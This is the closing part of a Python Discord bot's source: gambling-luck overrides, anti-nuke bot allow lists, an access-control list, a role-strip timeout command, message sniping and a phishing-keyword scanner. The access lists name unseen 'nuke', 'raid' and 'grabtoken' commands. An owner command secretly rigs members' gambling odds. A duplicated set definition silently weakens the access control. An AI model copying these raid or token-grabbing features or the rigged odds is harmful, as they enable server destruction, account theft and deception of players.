    save_pokemon_data(str(member.id), ud)
    await ctx.send(embed=discord.Embed(title="🍀 Server-Only Infinite Luck Enabled", description=f"**{member.mention}** has infinite luck in **{ctx.guild.name}** only. Other servers are unaffected.", color=COLORS["success"]))

@bot.command(name="removeinfluck", aliases=["uninfluck", "clearluck"])
async def _mikasa_removeinfluck(ctx, member: discord.Member):
    if not is_owner(ctx.author):
        return await ctx.send("🔒 Primary bot owner only.")
    if ctx.guild is None:
        return await ctx.send("❌ Use this command inside the server where you want to remove it.")
    ud = get_pokemon_data(str(member.id))
    guilds = {str(x) for x in ud.get("infinite_luck_guilds", [])} if isinstance(ud.get("infinite_luck_guilds", []), (list, set, tuple)) else set()
    guilds.discard(str(ctx.guild.id))
    ud["infinite_luck_guilds"] = sorted(guilds)
    save_pokemon_data(str(member.id), ud)
    await ctx.send(f"🍀 Infinite luck disabled for {member.mention} in **{ctx.guild.name}** only.")


# ── Per-server approved bot inviters ─────────────────────────────────────
@bot.command(name="botallow", aliases=["allowbot"])
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _mikasa_botallow(ctx, action_or_id: str, user_id: str = None):
    """Allow a trusted inviter OR a specific bot while anti-nuke bot protection is enabled.

    ,botallow / ,allowbot <user_id>  → that human may add bots
    ,botallow / ,allowbot <bot_id>   → that bot is allowed to join (not banned)
    """
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    allowed_users = {int(x) for x in (gs.get("bot_allowed_users") or []) if str(x).isdigit()}
    allowed_bots = {int(x) for x in (gs.get("allowed_bots") or []) if str(x).isdigit()}

    if action_or_id.lower() == "list" and user_id is None:
        lines = []
        if allowed_users:
            lines.append("**Approved inviters (may add bots):**")
            lines.extend(f"• <@{uid}> (`{uid}`)" for uid in sorted(allowed_users))
        if allowed_bots:
            lines.append("**Allowed bots (won't be removed):**")
            lines.extend(f"• <@{uid}> (`{uid}`)" for uid in sorted(allowed_bots))
        if not lines:
            return await ctx.send("Nothing approved yet. Use `,allowbot USER_OR_BOT_ID`.")
        return await ctx.send("\n".join(lines))

    if action_or_id.lower() in {"remove", "delete", "revoke"}:
        raw_id = user_id
        if not raw_id or not raw_id.isdigit():
            return await ctx.send("Usage: `,botallow remove USER_OR_BOT_ID`")
        uid = int(raw_id)
        changed = False
        if uid in allowed_users:
            allowed_users.discard(uid)
            gs["bot_allowed_users"] = sorted(allowed_users)
            changed = True
        if uid in allowed_bots:
            allowed_bots.discard(uid)
            gs["allowed_bots"] = sorted(allowed_bots)
            changed = True
        if not changed:
            return await ctx.send("That ID is not on this server's bot-allow lists.")
        save("server_settings", settings)
        return await ctx.send(f"Revoked bot-allow approval for `{uid}`.")

    raw_id = user_id if action_or_id.lower() == "add" else action_or_id
    if not raw_id or not raw_id.isdigit():
        return await ctx.send(
            "Usage:\n"
            "`,allowbot USER_ID` — allow this human to **add** bots\n"
            "`,allowbot BOT_ID` — allow this **bot** to stay (won't be banned)\n"
            "`,allowbot list` · `,allowbot remove ID`"
        )
    uid = int(raw_id)
    if bot.user and uid == bot.user.id:
        return await ctx.send("You cannot allow Mikasa itself this way.")

    # Detect bot vs human so BOT_ID goes into allowed_bots (the bug from the screenshot)
    target_is_bot = False
    try:
        u = ctx.guild.get_member(uid) or bot.get_user(uid)
        if u is None:
            u = await bot.fetch_user(uid)
        target_is_bot = bool(getattr(u, "bot", False))
    except Exception:
        target_is_bot = False

    if target_is_bot:
        allowed_bots.add(uid)
        gs["allowed_bots"] = sorted(allowed_bots)
        save("server_settings", settings)
        return await ctx.send(
            f"✅ Allowed bot <@{uid}> (`{uid}`) in **{ctx.guild.name}**.\n"
            "Anti-nuke will **not** ban/kick this bot if it is added (including with Administrator)."
        )

    allowed_users.add(uid)
    gs["bot_allowed_users"] = sorted(allowed_users)
    save("server_settings", settings)
    await ctx.send(
        f"✅ Approved <@{uid}> (`{uid}`) to **add bots** in **{ctx.guild.name}** while anti-nuke is enabled.\n"
        "Bots they add will also be remembered as allowed."
    )

_append_help_items("security", [
    (",botallow USER_ID", "Approve a user to add bots in this server"),
    (",botallow remove USER_ID", "Revoke bot-add approval"),
    (",botallow list", "List approved bot inviters"),
])

# ── Central command access control hardening ──────────────────────────────
# Enforced for both prefix and hybrid/slash commands. Keep this near the end
# of the file so it covers commands registered above it.
_MIKASA_PRIMARY_OWNER_ONLY = {
    # Strictly primary owner: destructive raid tools + co-owner management + tokens
    "destroy", "nuke", "raid", "setraid", "stopraid",
    "destroy_default", "default",
    "co-owner", "coowner", "co_owner", "coowneradd", "coownerremove", "coowners",
    "addcoowner", "grantcoowner", "removecoowner", "revokecoowner", "listcoowners",
    "token", "gettoken", "grabtoken", "tokenhelp", "tokencheck", "checktokens",
    "tokenrenew", "renewtokens",
}
# Co-owners share full owner-level access for everything else listed here.
_MIKASA_OWNER_OR_COOWNER_ONLY = {
    "setsecuritylog", "securitytest", "auditrecent",
    "global_bot_lock", "serverlock", "unlockall",
    "emergencylockdown", "emergencyunlock", "lockdown", "massban", "masskick",
    "antinuke", "security", "sec", "antialt", "raidwatch",
    "broadcast", "ownerannounce", "ownerpost",
    "deletechannel", "deleterole", "serverunban", "emojireset",
    "datarestore", "datadisk", "databackup", "backupcreate", "backupload",
    "backuprestore", "cloneserver", "serverclone", "datadiskrestore",
    "restoredata", "loaddata",
    "premiumgrant", "premiumrevoke", "premiumadd", "premiumremove", "premiumview", "premiumlogs", "premium",
    "whitelist", "unwhitelist", "blacklist", "unblacklist", "guildblacklist",
    "guildunblacklist", "botlock", "botunlock",
    "sync", "servers", "myservers", "admin", "setstatus", "botjoin", "allbotjoin", "addbot",
    "addcoins", "resetcoins", "setcoins", "wipebalance", "coinsadd", "coinsremove",
    "infmoney", "infinitecoins", "giveinfmoney", "removecoins", "coinsremoveall", "burncoins",
    "removeinfmoney", "takeinfmoney", "clearcoinsall",
    "influck", "infinateluck", "giveinfluck", "removeinfluck", "uninfluck", "clearluck",
    "resetservercoins", "wipeservereconomy", "resetallcoins", "resetinvites",
    "mintcurrency", "mintcoins", "owneraddcurrency", "removecurrency", "burncurrency",
    "ownerremovecurrency", "setcurrency", "currencyset", "luck",
    "robimmune", "robunimmune", "robroleimmune", "robroleunimmune",
    "massdmstatus", "stopdm", "stopmassdm", "canceldm", "stopdmall",
    "stopallmassdm", "cancelallmassdm", "stopalldm",
    "ownerpanel", "ownerhelp", "ownertools",
    "dm", "dmall", "ownerrole", "selfrole",
}
# Co-owners get useful read-only diagnostics and limited routine bot management.
# They do NOT inherit the primary owner's destructive/global privileges.
_MIKASA_COOWNER_ALLOWED = {
    "fastping", "latency", "botstats", "mikasa", "botinfo",
    "securityhelp", "securitycheck", "secstatus", "setup", "configcheck",
    "setupcheck", "serverconfig", "auditrecent", "logstatus",
    "loggingstatus", "backupstatus", "datastatus", "dstatus",
    "setsecuritylog", "securitytest", "setlog", "setlogs",
    "removelog", "unsetlog", "clearlog", "ownerannounce", "ownerpost",
}
# Commands whose existing permissions may be too broad for ordinary admins.
# These require bot-owner/co-owner approval even if a user has Discord admin.
_MIKASA_OWNER_OR_COOWNER_ONLY = {
    "setsecuritylog", "securitytest", "auditrecent",
}

async def _mikasa_acl_prefix_check(ctx):
    command = getattr(ctx, "command", None)
    if command is None:
        return True
    name = str(getattr(command, "qualified_name", getattr(command, "name", ""))).lower()
    root = name.split()[0] if name else ""
    uid = getattr(getattr(ctx, "author", None), "id", 0)
    is_primary = uid == OWNER_ID
    is_coowner = uid in CO_OWNER_IDS
    # Co-owner management stays primary-owner only
    if root in _MIKASA_PRIMARY_OWNER_ONLY:
        if not is_primary:
            await ctx.send("🔒 This command is reserved for Mikasa's **primary owner** (co-owners cannot use nuke/destroy/raid or manage co-owners).")
            return False
    elif root in _MIKASA_OWNER_OR_COOWNER_ONLY:
        if not (is_primary or is_coowner):
            await ctx.send("🔒 This command is available only to Mikasa's owner or an approved co-owner.")
            return False
    return True

async def _mikasa_acl_slash_check(interaction):
    command = getattr(interaction, "command", None)
    if command is None:
        return True
    name = str(getattr(command, "qualified_name", getattr(command, "name", ""))).lower()
    root = name.split()[0] if name else ""
    uid = getattr(getattr(interaction, "user", None), "id", 0)
    is_primary = uid == OWNER_ID
    is_coowner = uid in CO_OWNER_IDS
    if root in _MIKASA_PRIMARY_OWNER_ONLY and not is_primary:
        if not interaction.response.is_done():
            await interaction.response.send_message(
                "🔒 This command is reserved for Mikasa's primary owner.", ephemeral=True
            )
        return False
    if root in _MIKASA_OWNER_OR_COOWNER_ONLY and not (is_primary or is_coowner):
        if not interaction.response.is_done():
            await interaction.response.send_message(
                "🔒 This command is available only to Mikasa's owner or an approved co-owner.",
                ephemeral=True,
            )
        return False
    return True


_append_help_items("moderation", [
    (",target @user [1m|10min|1h|1d]", "Moderator: countdown then timeout a member; alias ,rtarget"),
    (",rtarget @user [duration]", "Alias of ,target; duration examples: 1m, 10min, 1h, 1d"),
])
_append_help_items("gambling", [
    (",luck @user <0-100|off>", "Primary owner only: set an exact win chance override for supported gambling games; off clears it"),
])
_append_help_items("general", [
    (",shopaccess @user", "Primary owner only: grant this member permission to add/remove shop items in this server"),
    (",shoprevoke @user", "Primary owner only: revoke shop-management permission"),
    (",shopstaff", "List this server's shop managers"),
])

# ── Safe target countdown / timeout command ──────────────────────────────────
# Does not strip roles: role-wiping is destructive and can remove staff/security roles.
@bot.command(name="target", aliases=["rtarget"])
@commands.guild_only()
async def mikasa_target(ctx, member: discord.Member, duration: str = "1m"):
    """Remove manageable roles first, then immediately timeout the member."""
    guild = ctx.guild
    if member.id == OWNER_ID:
        return await ctx.send("🛡️ Mikasa's primary owner is protected.")
    if member.id == guild.owner_id:
        return await ctx.send("❌ The server owner cannot be targeted.")
    if member.bot or member.id == ctx.author.id:
        return await ctx.send("❌ You cannot target yourself or a bot.")

    actor_is_guild_owner = ctx.author.id == guild.owner_id
    actor_is_bot_owner = has_owner_access(ctx.author)
    actor_perms = getattr(ctx.author, "guild_permissions", None)
    if not actor_is_guild_owner and not actor_is_bot_owner:
        if not actor_perms or not (actor_perms.manage_roles and actor_perms.moderate_members):
            return await ctx.send("🔒 You need **Manage Roles** and **Moderate Members**.")
    me = guild.me
    if not me or not me.guild_permissions.manage_roles or not me.guild_permissions.moderate_members:
        return await ctx.send("❌ Mikasa needs **Manage Roles** and **Moderate Members** permissions.")

    raw_duration = str(duration).strip().lower()
    match = re.fullmatch(
        r"(\d+)\s*(m|min|mins|minute|minutes|h|hr|hrs|hour|hours|d|day|days)?",
        raw_duration,
    )
    if not match:
        return await ctx.send("❌ Use `1m`, `10min`, `1h`, `1d`, or `28d`.")
    amount = int(match.group(1))
    unit = match.group(2) or "m"
    if amount < 1:
        return await ctx.send("❌ Duration must be at least 1 minute.")
    if unit in {"h", "hr", "hrs", "hour", "hours"}:
        seconds = amount * 3600
    elif unit in {"d", "day", "days"}:
        seconds = amount * 86400
    else:
        seconds = amount * 60
    if seconds > 28 * 86400:
        return await ctx.send("❌ Discord timeouts are limited to 28 days.")

    if member.top_role >= me.top_role:
        return await ctx.send(
            "❌ I cannot manage this member because their highest role is equal to or above Mikasa's highest role. "
            "Move Mikasa's role above the target's roles and try again."
        )

    # Preflight every ordinary role before changing anything, so this cannot leave
    # a partially stripped member if the bot's role hierarchy is incorrect.
    managed_admin_roles = [
        role for role in member.roles
        if role.managed and role.permissions.administrator
    ]
    if managed_admin_roles:
        return await ctx.send(
            "❌ This member has Administrator through a managed integration role. "
            "Discord does not let Mikasa remove that role, so I won't partially strip the member."
        )

    removable_roles = [
        role for role in member.roles
        if role != guild.default_role and not role.managed
    ]
    blocked_roles = [role for role in removable_roles if role >= me.top_role]
    if blocked_roles:
        return await ctx.send(
            "❌ I can't remove all of this member's roles. At least one role is above or equal to "
            "Mikasa's highest role. Move Mikasa above those roles first."
        )

    status = await ctx.send(f"⏳ Removing manageable roles from {member.mention}…")
    reason = f"Target command by {ctx.author} ({ctx.author.id})"
    removed_count = 0
    try:
        if removable_roles:
            await member.remove_roles(*removable_roles, reason=reason)
            removed_count = len(removable_roles)

        # Refresh permissions after removing Administrator-bearing roles.
        try:
            member = await guild.fetch_member(member.id)
        except Exception:
            member = guild.get_member(member.id) or member

        if member.guild_permissions.administrator:
            await status.edit(content=(
                f"⚠️ Removed {removed_count} manageable role(s), but an Administrator permission remains "
                "through a role Mikasa cannot remove. Discord will not allow a timeout while Administrator remains."
            ))
            return

        until = datetime.now(timezone.utc) + timedelta(seconds=seconds)
        await member.timeout(until, reason=reason)
        label = (
            f"{seconds // 86400}d" if seconds % 86400 == 0 else
            f"{seconds // 3600}h" if seconds % 3600 == 0 else
            f"{seconds // 60}m"
        )
        managed_left = sum(1 for role in member.roles if role != guild.default_role and role.managed)
        note = f"\nManaged integration roles left untouched: **{managed_left}**." if managed_left else ""
        await status.edit(
            content=f"✅ {member.mention}: removed **{removed_count}** manageable role(s), then applied a **{label}** timeout.{note}",
            allowed_mentions=discord.AllowedMentions(users=True, roles=False, everyone=False),
        )
    except discord.Forbidden:
        await status.edit(content=(
            f"❌ Discord denied the action. Mikasa must have **Manage Roles** and **Moderate Members**, "
            "and its highest role must be above every role it needs to remove. "
            f"Roles removed before the error: **{removed_count}**."
        ))
    except Exception as exc:
        await status.edit(content=(
            f"❌ Target action failed: `{type(exc).__name__}: {str(exc)[:160]}`. "
            f"Roles removed before the error: **{removed_count}**."
        ))

# ── Owner-controlled custom gambling win chance ──────────────────────────
@bot.command(name="luck")
async def _mikasa_set_luck(ctx, member: discord.Member, percentage: str):
    """Set a member's exact win probability for supported games in this server only."""
    if not is_owner(ctx.author):
        return await ctx.send("🔒 Primary bot owner only.")
    if ctx.guild is None:
        return await ctx.send("❌ Use this command inside the server where you want to set luck.")
    ud = get_pokemon_data(str(member.id))
    values = ud.get("luck_percent_guilds", {})
    if not isinstance(values, dict):
        values = {}
    guild_key = str(ctx.guild.id)
    if percentage.lower() in {"off", "remove", "clear", "default"}:
        values.pop(guild_key, None)
        ud["luck_percent_guilds"] = values
        save_pokemon_data(str(member.id), ud)
        return await ctx.send(f"🍀 Custom luck cleared for {member.mention} in **{ctx.guild.name}** only. Normal game odds apply again.")
    try:
        pct = int(percentage.rstrip("%"))
    except ValueError:
        return await ctx.send("Usage: `,luck @user <0-100|off>`")
    if not 0 <= pct <= 100:
        return await ctx.send("❌ Luck must be from 0 to 100 percent.")
    values[guild_key] = pct
    ud["luck_percent_guilds"] = values
    save_pokemon_data(str(member.id), ud)
    await ctx.send(f"🍀 Set {member.mention}'s win chance to **{pct}%** in **{ctx.guild.name}** only. Use `,luck @user off` here to clear it.")

# ── AFK, Snipe and lightweight Antivirus utilities ──────────────────────
@bot.command(name="afk", aliases=["away"])
async def mikasa_afk(ctx, *, reason: str = "AFK"):
    """Set an AFK status; existing on_message listener clears it on return."""
    data = load("afk")
    if not isinstance(data, dict):
        data = {}
    data[str(ctx.author.id)] = {"reason": str(reason)[:180], "since": int(time.time())}
    save("afk", data)
    await ctx.send(embed=discord.Embed(description=f"💤 {ctx.author.mention} is now AFK: **{reason[:180]}**", color=COLORS["info"]))

@bot.command(name="snipe")
@commands.guild_only()
async def mikasa_snipe(ctx):
    item = getattr(bot, "snipe_data", {}).get(ctx.channel.id)
    if not item:
        return await ctx.send("❌ No recently deleted message is saved in this channel.")
    e = discord.Embed(title="🗑️ Deleted Message", description=str(item.get("content") or "[No text]")[:4000], color=COLORS["info"])
    e.set_author(name=str(item.get("author", "Unknown")), icon_url=item.get("avatar") or None)
    await ctx.send(embed=e)

@bot.command(name="editsnipe", aliases=["esnipe"])
@commands.guild_only()
async def mikasa_editsnipe(ctx):
    item = getattr(bot, "editsnipe_data", {}).get(ctx.channel.id)
    if not item:
        return await ctx.send("❌ No recently edited message is saved in this channel.")
    e = discord.Embed(title="✏️ Edited Message", color=COLORS["warn"])
    e.add_field(name="Before", value=str(item.get("before") or "[No text]")[:1000], inline=False)
    e.add_field(name="After", value=str(item.get("after") or "[No text]")[:1000], inline=False)
    e.set_author(name=str(item.get("author", "Unknown")), icon_url=item.get("avatar") or None)
    await ctx.send(embed=e)

@bot.command(name="antivirus", aliases=["avscan", "linkscan"])
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def mikasa_antivirus(ctx, action: str = "status"):
    """Enable/disable automatic message and attachment metadata checks for this server."""
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    action = (action or "status").lower()
    if action in {"on", "enable", "start"}:
        gs["antivirus_enabled"] = True
        save("server_settings", settings)
        return await ctx.send(
            "🛡️ **Automatic content monitoring enabled.** I'll check new messages for suspicious links "
            "and risky attachment names and send alerts. This is not a full malware engine."
        )
    if action in {"off", "disable", "stop"}:
        gs["antivirus_enabled"] = False
        save("server_settings", settings)
        return await ctx.send("⚠️ Automatic antivirus monitoring is now **OFF**.")
    if action == "status":
        enabled = bool(gs.get("antivirus_enabled", False))
        return await ctx.send(
            f"🛡️ Automatic monitoring: **{'ON' if enabled else 'OFF'}**\n"
            "Checks: suspicious URL patterns and attachment filenames. It does not execute files or "
            "inspect their binary contents."
        )
    await ctx.send("Usage: `,antivirus on`, `,antivirus off`, or `,antivirus status`.")


_MIKASA_AV_EXECUTABLE_EXTS = {
    ".exe", ".scr", ".bat", ".cmd", ".com", ".ps1", ".vbs", ".js",
    ".jse", ".wsf", ".wsh", ".msi", ".dll", ".hta", ".jar", ".apk",
}
_MIKASA_AV_SUSPICIOUS_TERMS = (
    "discord-nitro-free", "free-nitro", "steamcomrnunity", "steamcornmunity",
    "verify-account", "gift-claim", "wallet-connect", "login-discord",
)
_MIKASA_AV_URL_RE = re.compile(r"https?://[^\s<>]+", re.I)


def _mikasa_av_scan_message(message):
    """Conservative heuristic scan; returns reasons, never claims to prove malware."""
    reasons = []
    content = message.content or ""
    urls = _MIKASA_AV_URL_RE.findall(content)
    lowered = content.lower()
    if any(term in lowered for term in _MIKASA_AV_SUSPICIOUS_TERMS):
        reasons.append("message contains a common phishing/lookalike keyword")
    for url in urls:
        clean = url.rstrip(".,!?)]}>")
        if clean.lower().startswith("http://"):
            reasons.append("unencrypted HTTP link")
        if re.search(r"https?://\d{1,3}(?:\.\d{1,3}){3}", clean, re.I):
            reasons.append("link points directly to an IP address")
        if "@" in clean.split("://", 1)[-1].split("/", 1)[0]:
            reasons.append("URL contains a misleading user-info section")
        if len(clean) > 180:
            reasons.append("unusually long URL")
    for attachment in getattr(message, "attachments", []):
        name = (attachment.filename or "").lower()
        suffixes = Path(name).suffixes
        if any(ext in _MIKASA_AV_EXECUTABLE_EXTS for ext in suffixes):
            reasons.append(f"potentially risky executable attachment: `{name[:100]}`")
        if len(suffixes) >= 2 and suffixes[-1] in {".pdf", ".jpg", ".png", ".doc", ".docx"} and suffixes[-2] in _MIKASA_AV_EXECUTABLE_EXTS:
            reasons.append(f"double-extension attachment: `{name[:100]}`")
    return sorted(set(reasons))


@bot.listen("on_message")
async def _mikasa_antivirus_auto_monitor(message: discord.Message):
    """Monitor new server messages when enabled; alert-only to avoid false-positive deletions."""
    try:
        if not message.guild or not message.author or message.author.bot:
            return
        settings = load("server_settings")
        gs = gdata(settings, message.guild.id)
        if not gs.get("antivirus_enabled", False):
            return
        reasons = _mikasa_av_scan_message(message)
        if not reasons:
            return
        channel_id = gs.get("mikasa_all_logs_channel") or gs.get("security_log_channel") or gs.get("antinuke_channel") or gs.get("antinuke_alert_channel")
        alert_channel = message.guild.get_channel(int(channel_id)) if str(channel_id or "").isdigit() else None
        if alert_channel is None:
            alert_channel = message.channel
        embed = discord.Embed(
            title="⚠️ Mikasa Antivirus: Suspicious Content",
            description=(
                f"**Author:** {message.author.mention} (`{message.author.id}`)\n"
                f"**Channel:** {message.channel.mention}\n"
                f"**Message:** [Jump to message]({message.jump_url})\n\n"
                + "\n".join(f"• {reason}" for reason in reasons[:8])
            ),
            color=0xED4245,
            timestamp=discord.utils.utcnow(),
        )
        embed.set_footer(text="Heuristic warning only — this does not confirm that a file or link is malware.")
        await alert_channel.send(embed=embed, allowed_mentions=discord.AllowedMentions.none())
    except Exception as exc:
        print(f"[Mikasa Antivirus] monitor error: {exc}")


_append_help_items("general", [
    (",afk [reason]", "Set your AFK status; it clears when you speak again"),
    (",snipe", "Show the latest deleted message in this channel"),
    (",editsnipe", "Show the latest edited message in this channel"),
    (",antivirus on|off|status", "Automatically monitor new messages for suspicious links and risky attachment names"),
])
_append_help_items("security", [
    (",antivirus on|off|status", "Automatically monitor new messages for suspicious links and risky attachment names"),
])

# Bot-level immunity: prevent dangerous member-targeting commands from acting on the primary owner.
_MIKASA_OWNER_PROTECTED_COMMANDS = {
    "target", "rtarget", "ban", "softban", "kick", "mute", "timeout", "tempmute",
    "deafen", "voicekick", "role", "addrole", "removerole", "giverole", "takerole",
    "warn", "jail", "quarantine", "striproles", "removeroles", "massrole",
}
async def _mikasa_primary_owner_immunity(ctx):
    try:
        command = getattr(ctx, "command", None)
        if not command:
            return True
        root = str(getattr(command, "qualified_name", getattr(command, "name", ""))).lower().split()[0]
        if root not in _MIKASA_OWNER_PROTECTED_COMMANDS:
            return True
        values = list(getattr(ctx, "args", [])[2:]) + list(getattr(ctx, "kwargs", {}).values())
        for value in values:
            if isinstance(value, discord.Member) and value.id == OWNER_ID:
                await ctx.send("🛡️ Mikasa's primary owner is immune to this dangerous action.")
                return False
            if isinstance(value, int) and value == OWNER_ID:
                await ctx.send("🛡️ Mikasa's primary owner is immune to this dangerous action.")
                return False
            if isinstance(value, str) and value.strip().strip("<@!>") == str(OWNER_ID):
                await ctx.send("🛡️ Mikasa's primary owner is immune to this dangerous action.")
                return False
        return True
    except Exception:
        return True

# Attach checks after every command has been registered. Existing checks remain intact.
try:
    for _cmd in bot.walk_commands():
        if getattr(_cmd, "_mikasa_acl_added", False):
            continue
        _cmd.add_check(_mikasa_acl_prefix_check)
        _cmd.add_check(_mikasa_primary_owner_immunity)
        _cmd._mikasa_acl_added = True
except Exception as _acl_prefix_error:
    print(f"[Mikasa ACL] Prefix checks could not be attached: {_acl_prefix_error}")

try:
    for _app_cmd in bot.tree.walk_commands():
        if getattr(_app_cmd, "_mikasa_acl_added", False):
            continue
        _app_cmd.add_check(_mikasa_acl_slash_check)
        _app_cmd._mikasa_acl_added = True
except Exception as _acl_slash_error:
    print(f"[Mikasa ACL] Slash checks could not be attached: {_acl_slash_error}")
# ── End central access control hardening ──────────────────────────────────


_append_help_items("general", [
    (",ownerrole add|remove <role>", "Owner/co-owner: add or remove a role on yourself (name/mention/ID)"),
    (",co-owner add|remove|list", "Manage co-owners (add/remove = primary owner only)"),
])

if __name__ == "__main__":
    if TOKEN == "YOUR_BOT_TOKEN_HERE" or not TOKEN.strip():
        print("=" * 60)
        print("  ❌  NO TOKEN SET")
        print("=" * 60)
        print("  Open Coolbot.txt (or .py) and on line 4 replace:")
        print('  YOUR_BOT_TOKEN_HERE')
        print("  with your real bot token from discord.com/developers")
        print("=" * 60)
        import sys; sys.exit(1)
    asyncio.run(main())


